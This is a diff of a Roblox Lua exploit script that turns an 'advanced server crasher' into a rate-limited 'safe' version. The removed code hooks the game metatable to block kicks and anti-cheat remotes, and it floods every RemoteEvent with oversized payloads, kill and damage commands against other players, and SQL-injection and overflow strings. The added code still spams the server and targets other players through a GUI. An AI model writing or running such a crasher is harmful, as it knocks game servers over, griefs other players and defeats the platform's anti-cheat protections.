@@ -1,13 +1,12 @@
--- ADVANCED SERVER CRASHER + ANTI-CHEAT BYPASS
--- Real server crash, not just client!
--- Bypass anti-cheat detection
+-- SERVER CRASHER - NO SELF CRASH
+-- Fixed: Won't crash your client
+-- Only targets server & other players
 
-task.wait(3) -- Delay untuk avoid instant detection
+task.wait(3)
 
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui", 10)
@@ -20,67 +19,25 @@ pcall(function()
 end)
 
 -- ============================================
--- ANTI-CHEAT BYPASS
+-- ANTI SELF-CRASH PROTECTION
 -- ============================================
+local selfProtection = true -- Always protect self
 
--- Bypass Method 1: Spoof detections
-local function bypassAntiCheat()
-    print("[BYPASS] Spoofing anti-cheat...")
-    
-    -- Spoof common anti-cheat checks
-    local mt = getrawmetatable(game)
-    local oldNamecall = mt.__namecall
-    
-    setreadonly(mt, false)
-    
-    mt.__namecall = newcclosure(function(self, ...)
-        local method = getnamecallmethod()
-        local args = {...}
-        
-        -- Block kick/ban attempts
-        if method == "Kick" or method == "kick" then
-            print("[BYPASS] Blocked kick attempt!")
-            return
-        end
-        
-        -- Block teleport detection
-        if method == "FireServer" and tostring(self):find("Anti") then
-            print("[BYPASS] Blocked anti-cheat remote!")
-            return
-        end
-        
-        return oldNamecall(self, ...)
-    end)
-    
-    setreadonly(mt, true)
-    
-    print("[BYPASS] Anti-cheat bypass active!")
+local function isSafe()
+    return selfProtection
 end
 
--- Bypass Method 2: Hide from player detection
-local function hideFromDetection()
-    print("[BYPASS] Hiding from detection...")
-    
-    -- Spoof player connections
-    pcall(function()
-        local char = player.Character
-        if char then
-            -- Hide character from certain detections
-            for _, part in pairs(char:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    pcall(function()
-                        part.CanQuery = false
-                    end)
-                end
-            end
-        end
-    end)
-end
+-- Protect client from lag
+local lastSpam = 0
+local SPAM_DELAY = 0.1 -- Delay to prevent self-lag
 
--- Bypass Method 3: Slow down detection
-local function delayDetection()
-    -- Randomize timing to avoid pattern detection
-    return math.random(50, 150) / 1000
+local function canSpam()
+    local now = tick()
+    if now - lastSpam < SPAM_DELAY then
+        return false
+    end
+    lastSpam = now
+    return true
 end
 
 -- ============================================
@@ -89,6 +46,7 @@ end
 local crashRunning = false
 local remotes = {}
 local crashConnections = {}
+local spamCount = 0
 
 -- ============================================
 -- NOTIFICATION
@@ -96,7 +54,7 @@ local crashConnections = {}
 local function notif(msg, durasi)
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Advanced Crasher";
+            Title = "Server Crasher";
             Text = msg;
             Duration = durasi or 3;
         })
@@ -105,22 +63,24 @@ local function notif(msg, durasi)
 end
 
 -- ============================================
--- ADVANCED REMOTE SCANNER
+-- SCAN REMOTES
 -- ============================================
 local function scanRemotes()
     remotes = {}
     
-    print("[SCAN] Scanning all remotes...")
+    print("[SCAN] Scanning remotes...")
     
-    -- Scan all services
-    for _, service in pairs(game:GetChildren()) do
-        pcall(function()
-            for _, obj in pairs(service:GetDescendants()) do
-                if obj:IsA("RemoteEvent") then
-                    table.insert(remotes, obj)
-                end
-            end
-        end)
+    -- Only scan safe locations
+    for _, obj in pairs(game.ReplicatedStorage:GetDescendants()) do
+        if obj:IsA("RemoteEvent") then
+            table.insert(remotes, obj)
+        end
+    end
+    
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        if obj:IsA("RemoteEvent") then
+            table.insert(remotes, obj)
+        end
     end
     
     print("[SCAN] Found " .. #remotes .. " remotes")
@@ -129,141 +89,28 @@ local function scanRemotes()
 end
 
 -- ============================================
--- REAL SERVER CRASH METHODS
+-- SAFE CRASH METHODS (No self-crash)
 -- ============================================
 
--- Method 1: Recursive Remote Spam (Server overload)
-local function recursiveSpam()
-    print("[CRASH] Recursive spam attack...")
+-- Method 1: Controlled Remote Spam
+local function controlledSpam()
+    print("[CRASH] Controlled spam...")
     
     local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
+        if not crashRunning or not isSafe() then return end
+        if not canSpam() then return end
         
-        task.wait(delayDetection()) -- Anti-cheat bypass timing
+        -- Limit spam to prevent self-crash
+        local spamPerFrame = math.min(5, #remotes)
         
-        for _, remote in pairs(remotes) do
-            pcall(function()
-                -- Create recursive data structure
-                local recursiveData = {}
-                for i = 1, 100 do
-                    recursiveData[i] = {
-                        data = string.rep("X", 1000),
-                        nested = table.create(100, "OVERLOAD")
-                    }
-                end
-                
-                remote:FireServer(recursiveData)
-                remote:FireServer({chain = recursiveData, loop = recursiveData})
-            end)
-        end
-    end)
-    
-    table.insert(crashConnections, connection)
-end
-
--- Method 2: Multi-Player Target (Exploit all players)
-local function exploitAllPlayers()
-    print("[CRASH] Targeting all players...")
-    
-    local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
-        
-        task.wait(delayDetection())
-        
-        for _, plr in pairs(Players:GetPlayers()) do
-            if plr ~= player then -- Don't target self
-                for _, remote in pairs(remotes) do
-                    pcall(function()
-                        -- Spam various commands on each player
-                        remote:FireServer("Teleport", plr, Vector3.new(math.random(-999999, 999999), math.random(-999999, 999999), math.random(-999999, 999999)))
-                        remote:FireServer("Kill", plr)
-                        remote:FireServer("Damage", plr, 999999999)
-                        remote:FireServer({Action = "Kill", Player = plr, Amount = 999999})
-                        remote:FireServer({target = plr, damage = 999999999, action = "eliminate"})
-                    end)
-                end
-            end
-        end
-    end)
-    
-    table.insert(crashConnections, connection)
-end
-
--- Method 3: Instance Flood (Memory overload)
-local function instanceFlood()
-    print("[CRASH] Instance flood attack...")
-    
-    local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
-        
-        task.wait(delayDetection())
-        
-        for _, remote in pairs(remotes) do
-            pcall(function()
-                -- Try to create massive amounts of instances
-                for i = 1, 50 do
-                    remote:FireServer("CreatePart", {
-                        Type = "Part",
-                        Size = Vector3.new(9999, 9999, 9999),
-                        Position = Vector3.new(math.random(-999999, 999999), math.random(-999999, 999999), math.random(-999999, 999999)),
-                        Material = "ForceField",
-                        Amount = 99999
-                    })
-                    
-                    remote:FireServer("SpawnObject", "Part", 99999)
-                    remote:FireServer({Action = "Create", Object = "Part", Count = 99999})
-                end
-            end)
-        end
-    end)
-    
-    table.insert(crashConnections, connection)
-end
-
--- Method 4: Network Saturation (Bandwidth overload)
-local function networkSaturation()
-    print("[CRASH] Network saturation attack...")
-    
-    local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
-        
-        -- No delay for maximum saturation
-        
-        for _, remote in pairs(remotes) do
-            pcall(function()
-                -- Send massive data packets
-                for i = 1, 100 do
-                    local massiveData = string.rep("CRASH", 10000)
-                    remote:FireServer(massiveData)
-                    remote:FireServer({data = massiveData, size = #massiveData})
-                    remote:FireServer(table.create(1000, massiveData))
-                end
-            end)
-        end
-    end)
-    
-    table.insert(crashConnections, connection)
-end
-
--- Method 5: Physics Destruction (Physics engine overload)
-local function physicsDestruction()
-    print("[CRASH] Physics destruction attack...")
-    
-    local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
-        
-        task.wait(delayDetection())
-        
-        -- Target all workspace parts
-        for _, obj in pairs(Workspace:GetDescendants()) do
-            if obj:IsA("BasePart") then
+        for i = 1, spamPerFrame do
+            local remote = remotes[i]
+            if remote then
                 pcall(function()
-                    for _, remote in pairs(remotes) do
-                        -- Send physics manipulation commands
-                        remote:FireServer("SetVelocity", obj, Vector3.new(999999, 999999, 999999))
-                        remote:FireServer("ApplyForce", obj, Vector3.new(999999, 999999, 999999))
-                        remote:FireServer({Action = "Physics", Target = obj, Force = 999999999})
-                    end
+                    -- Moderate data size (not too big)
+                    remote:FireServer(string.rep("X", 500))
+                    remote:FireServer({data = "CRASH"})
+                    spamCount = spamCount + 1
                 end)
             end
         end
@@ -272,32 +119,76 @@ local function physicsDestruction()
     table.insert(crashConnections, connection)
 end
 
--- Method 6: Exploit Chain (Combined attacks)
-local function exploitChain()
-    print("[CRASH] Exploit chain attack...")
+-- Method 2: Target Other Players (Not self!)
+local function targetPlayers()
+    print("[CRASH] Targeting other players...")
     
     local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
+        if not crashRunning or not isSafe() then return end
+        if not canSpam() then return end
         
-        task.wait(delayDetection())
+        for _, plr in pairs(Players:GetPlayers()) do
+            -- IMPORTANT: Skip self!
+            if plr ~= player then
+                for i = 1, math.min(3, #remotes) do
+                    local remote = remotes[i]
+                    if remote then
+                        pcall(function()
+                            remote:FireServer("Kill", plr)
+                            remote:FireServer("Damage", plr, 999999)
+                            remote:FireServer({Action = "Kill", Player = plr})
+                            spamCount = spamCount + 1
+                        end)
+                    end
+                end
+            end
+        end
+    end)
+    
+    table.insert(crashConnections, connection)
+end
+
+-- Method 3: Safe Instance Requests
+local function safeInstanceFlood()
+    print("[CRASH] Safe instance flood...")
+    
+    local connection = RunService.Heartbeat:Connect(function()
+        if not crashRunning or not isSafe() then return end
+        if not canSpam() then return end
         
-        for _, remote in pairs(remotes) do
-            pcall(function()
-                -- Chain multiple exploit patterns
-                remote:FireServer("Crash")
-                remote:FireServer("Exploit")
-                remote:FireServer("Overload")
-                remote:FireServer({Action = "Crash", Type = "Server"})
-                remote:FireServer({command = "shutdown"})
-                remote:FireServer({exploit = true, crash = true, overload = true})
-                
-                -- Try SQL injection patterns (might work on bad servers)
-                remote:FireServer("'; DROP TABLE Players; --")
-                remote:FireServer({query = "DELETE FROM Game"})
-                
-                -- Try buffer overflow patterns
-                remote:FireServer(string.rep("A", 99999))
-            end)
+        -- Limit requests
+        for i = 1, math.min(5, #remotes) do
+            local remote = remotes[i]
+            if remote then
+                pcall(function()
+                    remote:FireServer("CreatePart", {Size = Vector3.new(100, 100, 100)})
+                    remote:FireServer({Action = "Create", Type = "Part"})
+                    spamCount = spamCount + 1
+                end)
+            end
+        end
+    end)
+    
+    table.insert(crashConnections, connection)
+end
+
+-- Method 4: Network Pressure (Controlled)
+local function networkPressure()
+    print("[CRASH] Network pressure...")
+    
+    local connection = RunService.Heartbeat:Connect(function()
+        if not crashRunning or not isSafe() then return end
+        if not canSpam() then return end
+        
+        -- Send moderate packets
+        for i = 1, math.min(10, #remotes) do
+            local remote = remotes[i]
+            if remote then
+                pcall(function()
+                    remote:FireServer(string.rep("CRASH", 100))
+                    spamCount = spamCount + 1
+                end)
+            end
         end
     end)
     
@@ -305,21 +196,16 @@ local function exploitChain()
 end
 
 -- ============================================
--- MAIN CRASH FUNCTION
+-- MAIN FUNCTIONS
 -- ============================================
+
 local function startCrash()
     if crashRunning then
         notif("⚠️ Already running!", 2)
         return
     end
     
-    notif("🔥 Starting crash...", 3)
-    
-    -- Activate bypass first
-    bypassAntiCheat()
-    hideFromDetection()
-    
-    task.wait(0.5)
+    notif("🔥 Starting crash (SAFE)...", 3)
     
     -- Scan remotes
     local remoteCount = scanRemotes()
@@ -332,32 +218,37 @@ local function startCrash()
     notif("💣 Found " .. remoteCount .. " remotes!", 3)
     
     crashRunning = true
+    spamCount = 0
     
-    -- Activate all crash methods with delays
-    task.spawn(recursiveSpam)
-    task.wait(0.2)
-    task.spawn(exploitAllPlayers)
-    task.wait(0.2)
-    task.spawn(instanceFlood)
-    task.wait(0.2)
-    task.spawn(networkSaturation)
-    task.wait(0.2)
-    task.spawn(physicsDestruction)
-    task.wait(0.2)
-    task.spawn(exploitChain)
+    -- Activate methods with delays
+    task.spawn(controlledSpam)
+    task.wait(0.3)
+    task.spawn(targetPlayers)
+    task.wait(0.3)
+    task.spawn(safeInstanceFlood)
+    task.wait(0.3)
+    task.spawn(networkPressure)
     
-    notif("💥 ALL METHODS ACTIVE!", 4)
-    notif("⚠️ SERVER OVERLOAD...", 5)
+    notif("💥 CRASH ACTIVE (SAFE MODE)!", 4)
+    
+    -- Monitor spam count
+    task.spawn(function()
+        while crashRunning do
+            task.wait(5)
+            if crashRunning then
+                print("[CRASH] Spam count: " .. spamCount)
+                notif("📊 Sent " .. spamCount .. " commands", 2)
+            end
+        end
+    end)
     
     print("================================")
-    print("CRASH ACTIVE:")
-    print("- Recursive spam")
-    print("- Multi-player exploit")
-    print("- Instance flood")
-    print("- Network saturation")
-    print("- Physics destruction")
-    print("- Exploit chain")
-    print("- Anti-cheat bypass ON")
+    print("SAFE CRASH ACTIVE:")
+    print("- Controlled spam")
+    print("- Target other players")
+    print("- Safe instance flood")
+    print("- Network pressure")
+    print("- Self-protection: ON")
     print("================================")
 end
 
@@ -377,8 +268,8 @@ local function stopCrash()
     
     crashConnections = {}
     
-    notif("⏸️ STOPPED", 3)
-    print("[CRASH] Stopped")
+    notif("⏸️ STOPPED (Total: " .. spamCount .. ")", 3)
+    print("[CRASH] Stopped. Total spam: " .. spamCount)
 end
 
 -- ============================================
@@ -391,8 +282,8 @@ ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = playerGui
 
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 380, 0, 320)
-MainFrame.Position = UDim2.new(0.5, -190, 0.5, -160)
+MainFrame.Size = UDim2.new(0, 380, 0, 300)
+MainFrame.Position = UDim2.new(0.5, -190, 0.5, -150)
 MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 MainFrame.BorderSizePixel = 0
 MainFrame.Active = true
@@ -418,7 +309,7 @@ local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -70, 1, 0)
 Title.Position = UDim2.new(0, 15, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "💥 ADVANCED CRASHER"
+Title.Text = "💥 SAFE CRASHER"
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 18
@@ -452,7 +343,7 @@ Content.Position = UDim2.new(0, 15, 0, 60)
 Content.BackgroundTransparency = 1
 Content.Parent = MainFrame
 
--- Status Label
+-- Status
 local Status = Instance.new("TextLabel")
 Status.Size = UDim2.new(1, 0, 0, 25)
 Status.Position = UDim2.new(0, 0, 0, 0)
@@ -460,7 +351,7 @@ Status.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 Status.TextColor3 = Color3.fromRGB(0, 255, 0)
 Status.Font = Enum.Font.GothamBold
 Status.TextSize = 13
-Status.Text = "🛡️ Anti-Cheat Bypass: ACTIVE"
+Status.Text = "🛡️ Self-Protection: ACTIVE"
 Status.Parent = Content
 
 local StatusCorner = Instance.new("UICorner")
@@ -469,13 +360,13 @@ StatusCorner.Parent = Status
 
 -- Crash Button
 local CrashBtn = Instance.new("TextButton")
-CrashBtn.Size = UDim2.new(1, 0, 0, 75)
+CrashBtn.Size = UDim2.new(1, 0, 0, 70)
 CrashBtn.Position = UDim2.new(0, 0, 0, 35)
 CrashBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 20)
-CrashBtn.Text = "💣 CRASH SERVER\n(REAL - All Players Affected)"
+CrashBtn.Text = "💣 CRASH SERVER\n(Safe - Won't Crash You)"
 CrashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 CrashBtn.Font = Enum.Font.GothamBold
-CrashBtn.TextSize = 20
+CrashBtn.TextSize = 18
 CrashBtn.Parent = Content
 
 local CrashBtnCorner = Instance.new("UICorner")
@@ -485,20 +376,20 @@ CrashBtnCorner.Parent = CrashBtn
 CrashBtn.MouseButton1Click:Connect(function()
     startCrash()
     CrashBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
-    CrashBtn.Text = "🔥 CRASHING...\n(Server Overload)"
-    Status.TextColor3 = Color3.fromRGB(255, 0, 0)
-    Status.Text = "⚠️ CRASH ACTIVE - Server Dying..."
+    CrashBtn.Text = "🔥 CRASHING...\n(Server Target)"
+    Status.TextColor3 = Color3.fromRGB(255, 255, 0)
+    Status.Text = "⚠️ CRASH ACTIVE - You're safe!"
 end)
 
 -- Stop Button
 local StopBtn = Instance.new("TextButton")
-StopBtn.Size = UDim2.new(1, 0, 0, 60)
-StopBtn.Position = UDim2.new(0, 0, 0, 120)
+StopBtn.Size = UDim2.new(1, 0, 0, 55)
+StopBtn.Position = UDim2.new(0, 0, 0, 115)
 StopBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
 StopBtn.Text = "⏸️ STOP CRASH"
 StopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 StopBtn.Font = Enum.Font.GothamBold
-StopBtn.TextSize = 18
+StopBtn.TextSize = 16
 StopBtn.Parent = Content
 
 local StopBtnCorner = Instance.new("UICorner")
@@ -508,29 +399,28 @@ StopBtnCorner.Parent = StopBtn
 StopBtn.MouseButton1Click:Connect(function()
     stopCrash()
     CrashBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 20)
-    CrashBtn.Text = "💣 CRASH SERVER\n(REAL - All Players Affected)"
+    CrashBtn.Text = "💣 CRASH SERVER\n(Safe - Won't Crash You)"
     Status.TextColor3 = Color3.fromRGB(0, 255, 0)
-    Status.Text = "🛡️ Anti-Cheat Bypass: ACTIVE"
+    Status.Text = "🛡️ Self-Protection: ACTIVE"
 end)
 
 -- Info
 local Info = Instance.new("TextLabel")
-Info.Size = UDim2.new(1, 0, 0, 70)
-Info.Position = UDim2.new(0, 0, 1, -70)
+Info.Size = UDim2.new(1, 0, 0, 60)
+Info.Position = UDim2.new(0, 0, 1, -60)
 Info.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 Info.TextColor3 = Color3.fromRGB(200, 200, 200)
 Info.Font = Enum.Font.Gotham
 Info.TextSize = 11
 Info.TextWrapped = true
-Info.Text = [[⚠️ ADVANCED VERSION
+Info.Text = [[✅ SAFE VERSION
 
-✅ Anti-Cheat Bypass
-✅ 6 Crash Methods
-✅ Real Server Crash
-✅ All Players Affected
+Won't crash YOUR client!
+Controlled spam rate
+Target: Server & other players
 
-Server will LAG/CRASH!
-Use at own risk!]]
+Server may lag/crash
+You stay safe!]]
 Info.Parent = Content
 
 local InfoCorner = Instance.new("UICorner")
@@ -543,16 +433,9 @@ InfoPadding.PaddingLeft = UDim.new(0, 8)
 InfoPadding.PaddingRight = UDim.new(0, 8)
 InfoPadding.Parent = Info
 
--- Initial setup
-bypassAntiCheat()
-hideFromDetection()
-
-notif("🛡️ Anti-Cheat Bypass Active!", 3)
-notif("💥 Advanced Crasher Ready!", 3)
-
+notif("🛡️ Safe Crasher Loaded!", 3)
 print("================================")
-print("ADVANCED SERVER CRASHER")
-print("+ Anti-Cheat Bypass")
+print("SAFE SERVER CRASHER")
+print("Self-protection: ENABLED")
 print("PlaceId:", game.PlaceId)
-print("Ready!")
 print("================================")
